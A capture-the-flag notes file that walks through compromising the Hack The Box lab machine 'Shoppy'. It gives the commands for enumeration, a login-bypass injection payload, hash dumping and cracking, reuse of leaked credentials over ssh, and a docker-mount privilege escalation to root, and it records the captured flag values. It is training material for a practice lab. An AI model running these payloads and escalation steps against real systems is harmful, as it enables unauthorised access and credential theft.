# Shoppy

[Link]
[Solution](https://www.youtube.com/watch?v=3UGIfoIZw6Y)


Goal: using dirsearch, gobuster and seclists to find hidden subdomain and 
    login

## Commands

```bash

%% 1. use nmap and add it to etc/hosts
nmap -sC -sV 10.10.11.180
sudo vi /etc/hosts > 10.10.11.180 shoppy.htb

2. use dirsearch to find directory
python3 dirsearch.py -u http://shoppy.htb
gobuster vhost -w SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 50 -u http://shoppy.htb

3. We find that there is a page called `admin`
http://shoppy.htb/admin

4. go into database using SQL injection
admin'||'1==1'

5. search for 'admin' to download json file with hashed password

id: "62db0e93d6d6a999a66ee67a"
username: "admin"
password: 23c6877d9e2b564ef8b32c3a23de27b2

id: "62db0e93d6d6a999a66ee67b"
username: "josh"
password: 6ebcea65320589ca4f2f1ce039975995

echo "6ebcea65320589ca4f2f1ce039975995" > hash
hashcat -m 0 -a 0 -o out.txt --force hash rockyou.txt
cat out.txt # 6ebcea65320589ca4f2f1ce039975995:remembermethisway

6. Go to `mattermost.shoppy.htb`

Hey @josh,

For the deploy machine, you can create an account with these creds :
username: jaeger
password: Sh0ppyBest@pp!

7. ssh into these credentials
ssh jaeger@10.10.11.180

8. search for user and password
cat user.txt # "c5a6a6999d924b83573a16c04d4ac363"

In index.js:
mongoUri = 'mongodb://127.0.0.1/shoppy';
Mongo secret: DJ7aAdnkCZs9DZWx

>>> mongo "mongodb://127.0.0.1/shoppy"
>>> show dbs
>>> 

In sudo -u deploy /home/deploy/password-manager
Josh password manager!Please enter your master password: SampleAccess granted! Here is creds !cat /home/deploy/creds.txtAccess denied! This incident will be reported

Deploy Creds :
username: deploy
password: Deploying@pp!

>>> ssh deploy@10.10.11.180

9. Docker exploit root

>>> docker run -v /:/mnt --rm -it alpine chroot /mnt sh

cat root.txt
016f521bffe4933fdeea8f581cc1c31a

```

## To remember

- `did no follow redirect` on nmap: add ip address to `/etc/hosts`
- when we have a login page, try SQL injection: `admin'||'1==1`
- we can use `hashcat` with `rockyou.txt` to find password from hash
- Docker exploit root: `docker run -v /:/mnt --rm -it alpine chroot /mnt sh`

## Ressources

- https://infosecwriteups.com/cracking-hashes-with-hashcat-2b21c01c18ec
- 

